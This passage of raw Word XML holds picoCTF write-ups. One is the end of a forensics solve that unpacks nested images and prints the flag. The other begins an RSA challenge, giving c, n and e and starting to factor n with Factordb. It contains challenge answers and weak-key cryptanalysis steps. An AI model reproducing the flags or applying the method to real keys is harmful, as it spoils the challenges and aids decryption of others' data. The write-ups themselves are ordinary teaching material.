        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>79786         0x137AA         End of Zip archive, footer length: 22</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CB4C64D" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E286152"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ls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E2A6F9E" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>4_c.jpg  _4_c.jpg.extracted</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D08B85E"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 cd _4_c.jpg.extracted/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3295E24A"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ls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B16F930" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>136DA.zip  flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B628B23" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>root@kali:~/Downloads/_dolls.jpg.extracted/base_images/_2_c.jpg.extracted/base_images/_3_c.jpg.extracted/base_images/_4_c.jpg.extracted# cat flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23614946" w14:textId="0E80C2B7" w:rsidR="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>picoCTF{e3f378fe6c1ea7f6bc5ac2c3d6801c1f}root@kali:~/Downloads/_dolls.jpg.extracted/base_images/_2_c.jpg.extracted/base_images/_3_c.jpg.extracted/base_images/_4_c.jpg.extracted#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F4983FE" w14:textId="7B0EE33E" w:rsidR="00E86710" w:rsidRDefault="00E86710" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>{e3f378fe6c1ea7f6bc5ac2c3d6801c1f}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0530C8A0" w14:textId="3B8D426B" w:rsidR="00786656" w:rsidRDefault="00786656" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3539E7BA" w14:textId="097B90C8" w:rsidR="00786656" w:rsidRDefault="00786656" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="646E03B3" w14:textId="6B90C8F6" w:rsidR="00786656" w:rsidRDefault="00786656" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C7A6487" w14:textId="6E6F5CE4" w:rsidR="00786656" w:rsidRDefault="00786656" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37AB9B9A" w14:textId="77777777" w:rsidR="00786656" w:rsidRDefault="00786656" w:rsidP="00786656">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="540" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>Mind your Ps and Qs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7D3C56" w14:textId="77777777" w:rsidR="00786656" w:rsidRDefault="00786656" w:rsidP="00786656">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>by </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> HYPERLINK "https://ctftime.org/user/104836"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r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t> / </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> HYPERLINK "https://ctftime.org/team/147495" </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="0088CC"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>xnomas</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="0088CC"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="58807D77"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b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Tags:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="label"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
          <w:shd w:val="clear" w:color="auto" w:fill="3A87AD"/>
        </w:rPr>
        <w:t>easy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="label"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
          <w:shd w:val="clear" w:color="auto" w:fill="3A87AD"/>
        </w:rPr>
        <w:t>rsa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="545A3058" w14:textId="77777777" w:rsidR="00786656" w:rsidRDefault="00786656" w:rsidP="00786656">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>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Rating: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="category-value"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>5.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22FD9250" w14:textId="2A21BCC2" w:rsidR="00786656" w:rsidRDefault="00786656" w:rsidP="00786656">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:before="0" w:line="540" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:sz w:val="45"/>
          <w:szCs w:val="45"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="333333"/>
          <w:sz w:val="45"/>
          <w:szCs w:val="45"/>
        </w:rPr>
        <w:t>Mind your Ps and Qs</w:t>
      </w:r>
      <w:r w:rsidR="00E114AB">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="333333"/>
          <w:sz w:val="45"/>
          <w:szCs w:val="45"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00E114AB">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>HARD</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74E2C19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Category: Cryptography &lt;/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>br</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&gt; AUTHOR: SARA</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A2945A6"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Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C61C6F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In RSA, a small e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-keyword"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>value</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve"> can be problematic, but what about N? Can you decrypt </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-keyword"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>this</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E1A235B" w14:textId="77777777" w:rsidR="00786656" w:rsidRDefault="00786656" w:rsidP="00786656">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:before="0" w:line="540" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>Values</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BCB340C"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We have been given the following values:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D988FF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Decrypt my </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-keyword"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>super</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve"> sick RSA:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D7EE3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c: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-number"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="880000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>843044897663847841476319711639772861390329326681532977209935413827620909782846667</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56DB8F92"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n: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-number"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="880000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>1422450808944701344261903748621562998784243662042303391362692043823716783771691667</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="401FC615"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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-number"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="880000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>65537</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DFED8A4"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 xml:space="preserve">C is the ciphertext we wish to decode. N is the result of multiplying two prime numbers p and q, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>n = p * q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>. E is the multiplicative inverse of a private exponent </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t> modulo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>phi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>. Phi is equal to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>(p-1)*(q-1)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>. Here in a more ordered fashion:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54C9CA38"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C = ciphertext</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C5F9A7D"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 and q = prime numbers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AB68693"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n = p * q</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27559516"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phi = (p-1) * (q-1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1945451C" w14:textId="7E0F416E"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 xml:space="preserve">e = some number that 1 &lt; e &lt; phi and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>gcd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>e,phi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve">) == 1 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A4E23F4" w14:textId="50C9F692" w:rsidR="00FF69C5" w:rsidRDefault="00FF69C5"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Fonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="BDC1C6"/>
          <w:shd w:val="clear" w:color="auto" w:fill="202124"/>
        </w:rPr>
        <w:t>In mathematics, the greatest common divisor (GCD) of two or more integers, which are not all zero, is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF7866"/>
          <w:shd w:val="clear" w:color="auto" w:fill="202124"/>
        </w:rPr>
        <w:t>the largest positive integer that divides each of the integers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="BDC1C6"/>
          <w:shd w:val="clear" w:color="auto" w:fill="202124"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11790E07" w14:textId="77777777"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TMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>d = e^(-1) mod phi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C1BE7A0"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Great! Now we just need to find p and q...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0591D11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t xml:space="preserve">Factor </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>db</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="460F7C2E" w14:textId="77777777" w:rsidR="00786656" w:rsidRDefault="00000000" w:rsidP="00786656">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="135" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId102" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidR="00786656">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Helvetica" w:eastAsia="OpenSymbol" w:hAnsi="Helvetica"/>
            <w:color w:val="0088CC"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Factordb</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r w:rsidR="00786656">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t> is a database of factorised numbers. We could try out n:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B1BD138" w14:textId="523FD594" w:rsidR="00786656" w:rsidRDefault="00786656" w:rsidP="00786656">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:after="135" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-attr"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
